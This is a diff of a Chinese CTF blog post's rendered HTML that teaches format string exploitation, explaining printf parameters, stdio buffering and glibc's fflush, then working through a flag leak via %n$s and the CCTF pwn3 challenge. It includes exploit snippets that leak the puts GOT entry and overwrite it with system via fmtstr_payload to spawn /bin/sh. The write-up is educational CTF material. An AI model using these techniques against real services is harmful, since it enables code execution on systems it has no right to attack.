@@ -78,9 +78,33 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/heap/" class="animsition-link">heap<small>(1)</small></a></li>
+				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
-				    <li><a href="/categories/stack/" class="animsition-link">stack<small>(1)</small></a></li>
+				    <li><a href="/categories/Heap-Fastbin-Attack/" class="animsition-link">Heap - Fastbin Attack<small>(6)</small></a></li>
+				    
+				    <li><a href="/categories/Heap-Off-By-One/" class="animsition-link">Heap - Off By One<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Heap-Tcache/" class="animsition-link">Heap - Tcache<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(17)</small></a></li>
+				    
+				    <li><a href="/categories/OTHER-IO-FILE/" class="animsition-link">OTHER - IO FILE<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Pwn-college/" class="animsition-link">Pwn.college<small>(9)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-DynELF/" class="animsition-link">STACK - DynELF<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Format/" class="animsition-link">STACK - Format<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ROP/" class="animsition-link">STACK - ROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-SROP/" class="animsition-link">STACK - SROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Stack-Overflow/" class="animsition-link">STACK - Stack Overflow<small>(4)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2dlsolve/" class="animsition-link">STACK - ret2dlsolve<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-sandbox/" class="animsition-link">STACK - sandbox<small>(1)</small></a></li>
 				    
 				</ul>
         	</li>
@@ -175,7 +199,7 @@
     
     
     | 
-    <a href='/tags/format/'>format</a>
+    <a href='/tags/FMT/'>FMT</a>
     
     
 </span>
@@ -183,13 +207,13 @@
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<html><head></head><body><h2 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h2><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
+      		<h2 id="1）前言"><a href="#1）前言" class="headerlink" title="1）前言"></a>1）前言</h2><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
 <p>首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>
 <p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>
 <p>非常清晰地告诉我：我是垃圾。</p>
-<h2 id="2）格式化字符串基本原理">2）格式化字符串基本原理<a class="post-anchor" href="#2）格式化字符串基本原理"></a></h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
-<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre><code class="c">%[parameter][flags][field width][.precision][length]type
-</code></pre>
+<h2 id="2）格式化字符串基本原理"><a href="#2）格式化字符串基本原理" class="headerlink" title="2）格式化字符串基本原理"></a>2）格式化字符串基本原理</h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
+<h5 id="格式化字符串参数"><a href="#格式化字符串参数" class="headerlink" title="格式化字符串参数"></a>格式化字符串参数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li><p>parameter</p>
 <ul>
@@ -225,14 +249,14 @@
 <li><strong>p， void * 型，输出对应变量的值</strong>。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
 <li>n，不输出字符，<strong>但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li>
 </ul>
-<h5 id="格式化字符串漏洞利用">格式化字符串漏洞利用<a class="post-anchor" href="#格式化字符串漏洞利用"></a></h5><p>一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>
+<h5 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h5><p>一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>
 <p>一般来说不正确的方式有这几种</p>
 <ol>
 <li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>
 <li>通过打印的相关内存信息，泄露内存布局，获得有用的信息</li>
 </ol>
-<h2 id="3-例1-goodluck">3)例1:goodluck<a class="post-anchor" href="#3-例1-goodluck"></a></h2><p>话不多说，直接上例子。</p>
-<h3 id="程序逻辑分析">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析"></a></h3><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>
+<h2 id="3-例1-goodluck"><a href="#3-例1-goodluck" class="headerlink" title="3)例1:goodluck"></a>3)例1:goodluck</h2><p>话不多说，直接上例子。</p>
+<h3 id="程序逻辑分析"><a href="#程序逻辑分析" class="headerlink" title="程序逻辑分析"></a>程序逻辑分析</h3><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>
 <p>首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>
 <p>然后将flag的首地址给v9。</p>
 <p>然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（</p>
@@ -240,69 +264,36 @@
 <p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
 <p>但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。</p>
 <p>bss段存储未初始化的全局变量，也不是缓冲区吧。</p>
-<h4 id="缓冲区">缓冲区<a class="post-anchor" href="#缓冲区"></a></h4><p><em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>
+<h4 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h4><p><em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>
 <p>为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，<code>cingetchar</code>函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。</p>
-<h5 id="缓冲区的分类">缓冲区的分类<a class="post-anchor" href="#缓冲区的分类"></a></h5><h6 id="1-全缓冲。">1:全缓冲。<a class="post-anchor" href="#1-全缓冲。"></a></h6><p>只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>
-<h6 id="2-行缓冲">2:行缓冲<a class="post-anchor" href="#2-行缓冲"></a></h6><p>只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>
-<h6 id="3-无缓冲">3:无缓冲<a class="post-anchor" href="#3-无缓冲"></a></h6><ol>
+<h5 id="缓冲区的分类"><a href="#缓冲区的分类" class="headerlink" title="缓冲区的分类"></a>缓冲区的分类</h5><h6 id="1-全缓冲。"><a href="#1-全缓冲。" class="headerlink" title="1:全缓冲。"></a>1:全缓冲。</h6><p>只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>
+<h6 id="2-行缓冲"><a href="#2-行缓冲" class="headerlink" title="2:行缓冲"></a>2:行缓冲</h6><p>只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>
+<h6 id="3-无缓冲"><a href="#3-无缓冲" class="headerlink" title="3:无缓冲"></a>3:无缓冲</h6><ol>
 <li>无缓冲；标准<code>I/O</code>不缓存字符；其中表现最明显的就是标准错误输出流(<code>stderr</code>)，这使得出错信息尽快的返回给用户。</li>
 </ol>
 <p>（我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错）</p>
-<h5 id="fflush函数">fflush函数<a class="post-anchor" href="#fflush函数"></a></h5><p>然后是关于fflush函数的glibc源码。</p>
+<h5 id="fflush函数"><a href="#fflush函数" class="headerlink" title="fflush函数"></a>fflush函数</h5><p>然后是关于fflush函数的glibc源码。</p>
 <p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>
 <p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>
-<pre><code class="c">int
-_IO_new_file_sync (_IO_FILE *fp)
-{
-  _IO_ssize_t delta;
-  int retval = 0;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_sync (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t delta;</span><br><span class="line">  <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) </span><br><span class="line">    <span class="keyword">return</span> EOF;<span class="comment">//end of file</span></span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TODO</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">	delta -= eGptr () - Gbase ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (_IO_off64_t) EOF)</span><br><span class="line">	fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> ESPIPE</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">	; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure>
 
-  /*    char* ptr = cur_ptr(); */
-  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
-    if (_IO_do_flush(fp)) 
-    return EOF;//end of file
-  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;
-  if (delta != 0)
-    {
-#ifdef TODO
-      if (_IO_in_backup (fp))
-    delta -= eGptr () - Gbase ();
-#endif
-      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
-      if (new_pos != (_IO_off64_t) EOF)
-    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;
-#ifdef ESPIPE
-      else if (errno == ESPIPE)
-    ; /* Ignore error from unseekable devices. */
-#endif
-      else
-    retval = EOF;
-    }
-  if (retval != EOF)
-    fp-&gt;_offset = _IO_pos_BAD;
-  /* FIXME: Cleanup - can this be shared? */
-  /*    setg(base(), ptr, ptr); */
-  return retval;
-}
-libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
-</code></pre>
 <p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>
-<h5 id="pwntools与缓冲区机制">pwntools与缓冲区机制<a class="post-anchor" href="#pwntools与缓冲区机制"></a></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>
+<h5 id="pwntools与缓冲区机制"><a href="#pwntools与缓冲区机制" class="headerlink" title="pwntools与缓冲区机制"></a>pwntools与缓冲区机制</h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>
 <p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>
-<h4 id="ms？">%ms？<a class="post-anchor" href="#ms？"></a></h4><p>从缓冲区的研究回到程序的简单逻辑分析上。</p>
-<p><code>__isoc99_scanf("%ms", &amp;format);</code></p>
+<h4 id="ms？"><a href="#ms？" class="headerlink" title="%ms？"></a>%ms？</h4><p>从缓冲区的研究回到程序的简单逻辑分析上。</p>
+<p><code>__isoc99_scanf(&quot;%ms&quot;, &amp;format);</code></p>
 <p>接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里）</p>
 <p>然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。</p>
-<h3 id="漏洞利用">漏洞利用<a class="post-anchor" href="#漏洞利用"></a></h3><p>因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>
 <p>那么如何打印这个flag呢？</p>
 <p>我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" data-caption="截屏2021-10-26 下午10.31.45" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" alt="截屏2021-10-26 下午10.31.45"></a></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png" alt="截屏2021-10-26 下午10.31.45"></p>
 <p>flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。</p>
 <p>这时候就需要计算这个flag字符串与栈顶的偏移。</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.35.39.png" data-caption="截屏2021-10-26 下午10.35.39" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.35.39.png" alt="截屏2021-10-26 下午10.35.39"></a></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.35.39.png" alt="截屏2021-10-26 下午10.35.39"></p>
 <p>显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。</p>
 <p>利用%n$s打印参数，即可获得flag。</p>
-<h2 id="4-例2">4)例2<a class="post-anchor" href="#4-例2"></a></h2><p>经过刚才的开胃菜，我们总算进入了正题。</p>
+<h2 id="4-例2"><a href="#4-例2" class="headerlink" title="4)例2"></a>4)例2</h2><p>经过刚才的开胃菜，我们总算进入了正题。</p>
 <p>一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。</p>
 <p>但是如果需要修改函数的got表，我们需要满足几个条件：</p>
 <ol>
@@ -311,28 +302,19 @@ libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
 </ol>
 <p>一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（</p>
 <p>回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子</p>
-<h3 id="cctf-pwn3">cctf pwn3<a class="post-anchor" href="#cctf-pwn3"></a></h3><h5 id="程序分析">程序分析<a class="post-anchor" href="#程序分析"></a></h5><p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" data-caption="截屏2021-10-27 上午8.50.03" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" alt="截屏2021-10-27 上午8.50.03"></a></p>
-<h5 id="程序逻辑分析-1">程序逻辑分析<a class="post-anchor" href="#程序逻辑分析-1"></a></h5><p>还是先进行一个简单的逻辑分析。</p>
+<h3 id="cctf-pwn3"><a href="#cctf-pwn3" class="headerlink" title="cctf pwn3"></a>cctf pwn3</h3><h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png" alt="截屏2021-10-27 上午8.50.03"></p>
+<h5 id="程序逻辑分析-1"><a href="#程序逻辑分析-1" class="headerlink" title="程序逻辑分析"></a>程序逻辑分析</h5><p>还是先进行一个简单的逻辑分析。</p>
 <p>首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" data-caption="截屏2021-10-27 上午9.02.34" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" alt="截屏2021-10-27 上午9.02.34"></a></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png" alt="截屏2021-10-27 上午9.02.34"></p>
 <p>所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。</p>
 <p>当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址。</p>
 <p>首先我们确定字符串偏移。</p>
-<h5 id="gdb动调的一些坑">gdb动调的一些坑<a class="post-anchor" href="#gdb动调的一些坑"></a></h5><p>用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code> ERROR: Could not find ELF base!</code></p>
+<h5 id="gdb动调的一些坑"><a href="#gdb动调的一些坑" class="headerlink" title="gdb动调的一些坑"></a>gdb动调的一些坑</h5><p>用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code> ERROR: Could not find ELF base!</code></p>
 <p>原因详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/">摆烂第四天–gdb附加调试的一些黑魔法</a>的2.1节。</p>
 <p>因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。</p>
 <p>等问题解决了在再来调。</p>
-<pre><code class="python">tmp = 'sysbdmin'
-name = ""
-for i in tmp:
-    name += chr(ord(i) - 1)
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tmp = <span class="string">&#x27;sysbdmin&#x27;</span></span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">password</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-## password
-def password():
-    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
-    sh.sendline(name)
-</code></pre>
 <p>绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。</p>
 <p>这样就有了代码中的公式。</p>
 <p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>
@@ -340,40 +322,32 @@ def password():
 <p>关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>
 <p>原理参见：<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
 <p>这里的偏移是8</p>
-<pre><code class="python"># get the addr of puts
-puts_got = pwn3.got['puts']
-log.success('puts got : ' + hex(puts_got))
-put(b'1111', b'%8$s' + p32(puts_got))
-puts_addr = u32(get('1111')[:4])
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get the addr of puts</span></span><br><span class="line">puts_got = pwn3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts got : &#x27;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line">put(<span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;%8$s&#x27;</span> + p32(puts_got))</span><br><span class="line">puts_addr = u32(get(<span class="string">&#x27;1111&#x27;</span>)[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure>
+
+
+
 <p>然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。</p>
-<p>这里<code>%8$s' + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>
+<p>这里<code>%8$s&#39; + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>
 <p>然后接收信息，就是puts的got表。</p>
 <p>然后就是经典rop的确定libc基址和system地址，比较套路。</p>
 <p>下一个关键点是</p>
-<pre><code class="python">payload = fmtstr_payload(7, {puts_got: system_addr})
-put('/bin/sh;', payload)
-sh.recvuntil('ftp&gt;')
-sh.sendline('get')
-sh.recvuntil('enter the file name you want to get:')
-##gdb.attach(sh)
-sh.sendline('/bin/sh;') 
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class="line">put(<span class="string">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
 <p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>
 <p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>
 <p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
 <p>最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>
 <p>​    </p>
 <p>​    这个题的调试部分才是大头，一点一点把问题解决吧。</p>
-<h4 id="调试部分">调试部分<a class="post-anchor" href="#调试部分"></a></h4><p>​    思路和exp都很清楚的情况下，我们尝试对题目进行调试。</p>
-<h2 id="参考">参考<a class="post-anchor" href="#参考"></a></h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79504011">缓冲区机制详解</a></p>
+<h4 id="调试部分"><a href="#调试部分" class="headerlink" title="调试部分"></a>调试部分</h4><p>​    思路和exp都很清楚的情况下，我们尝试对题目进行调试。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79504011">缓冲区机制详解</a></p>
 <p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/2506.html">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>
 <p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf">difference between %ms and %s scanf</a></p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/">格式化字符串</a></p>
 <p>[格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)</p>
 </li>
 </ul>
-</body></html>
+
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
